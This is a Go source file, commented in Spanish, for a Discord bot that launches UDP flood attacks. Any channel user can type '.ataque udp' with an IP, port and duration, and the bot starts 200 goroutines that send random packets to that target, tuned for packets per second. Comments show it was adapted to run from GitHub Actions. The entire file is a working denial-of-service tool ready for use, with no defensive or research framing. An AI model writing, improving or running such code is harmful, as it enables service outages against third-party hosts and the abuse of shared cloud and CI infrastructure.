package main

import (
	//"bufio" // Eliminar esta linea
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

// Configuración global para priorizar PPS sobre GBPS
var (
	ppsLimit      = 5000 // Paquetes por segundo (Aumentado para priorizar PPS)
	packetSize    = 64   // Tamaño del paquete (Reducido para disminuir el ancho de banda)
	payload       []byte // Payload del paquete
	tokenFileName = "token.txt"
	commandPrefix = "." //  <- AQUÍ: Cambia el prefijo al que quieras
)

func init() {
	// Inicializa el payload con datos aleatorios
	payload = make([]byte, packetSize)
	rand.Read(payload)
}

func saveToken(token string) error {
	f, err := os.Create(tokenFileName)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(token)
	return err
}

func readToken() (string, error) {
	// Intenta leer el token desde la variable de entorno
	token := os.Getenv("DISCORD_TOKEN")
	if token != "" {
		return token, nil
	}

	// Si no está en la variable de entorno, intenta leerlo desde el archivo
	data, err := os.ReadFile(tokenFileName)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(data)), nil
}

func flood(target string, port int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		fmt.Println("Error al resolver la dirección:", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		fmt.Println("Error al conectar:", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	ticker := time.NewTicker(time.Second / time.Duration(ppsLimit)) // Ticker para controlar PPS
	defer ticker.Stop()

	for time.Now().Before(endTime) {
		select {
		case <-ticker.C: // Espera al siguiente tick
			_, err := conn.Write(payload)
			if err != nil {
				fmt.Println("Error al enviar el paquete:", err)
				continue
			}
		}
	}
}

func runFlood(target string, port, duration int) {
	rand.Seed(time.Now().UnixNano())
	threads := 200 // Número de threads (ajustable)
	var wg sync.WaitGroup
	wg.Add(threads)

	fmt.Printf("Iniciando ataque UDP a %s:%d con %d threads, %d PPS y tamaño de paquete %d bytes\n", target, port, threads, ppsLimit, packetSize)

	for i := 0; i < threads; i++ {
		go flood(target, port, duration, &wg)
	}

	wg.Wait()

	fmt.Printf("Ataque UDP a %s:%d finalizado.\n", target, port)
}

func main() {
	var token string
	var err error

	// Intenta leer el token
	token, err = readToken()
	if err != nil {
		fmt.Println("Error al leer el token:", err)
		// En GitHub Actions, no podemos solicitar la entrada del usuario
		// Comenta o elimina esta sección
		// fmt.Print("Introduce el token de tu bot de Discord: ")
		// reader := bufio.NewReader(os.Stdin)
		// token, _ = reader.ReadString('\n')
		// token = strings.TrimSpace(token)
		// saveToken(token)
		fmt.Println("Asegúrate de que la variable de entorno DISCORD_TOKEN esté configurada.")
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error al crear sesión de Discord:", err)
		return
	}

	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.Bot {
			return
		}
		content := m.Content
		if strings.HasPrefix(content, commandPrefix+"ataque") { // Usar commandPrefix
			args := strings.Fields(content)
			if len(args) == 1 {
				s.ChannelMessageSend(m.ChannelID, "Uso: `"+commandPrefix+"ataque udp [IP] [PUERTO] [TIEMPO]`")  // Usar commandPrefix
				return
			}
			if len(args) == 5 && args[1] == "udp" {
				ip := args[2]
				port, err1 := strconv.Atoi(args[3])
				duration, err2 := strconv.Atoi(args[4])
				if err1 != nil || err2 != nil {
					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido.")
					return
				}
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque UDP enviado a %s:%d por %d segundos...", ip, port, duration))
				go func() {
					runFlood(ip, port, duration)
					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
				}()
				return
			}
			s.ChannelMessageSend(m.ChannelID, "Parámetros incorrectos. Uso: `"+commandPrefix+"ataque [IP] [PUERTO] [TIEMPO]`")  // Usar commandPrefix
		}
	})

	err = dg.Open()
	if err != nil {
		fmt.Println("Error al abrir la conexión:", err)
		return
	}
	fmt.Println("Bot iniciado. Presiona CTRL+C para salir.")
	select {}
}
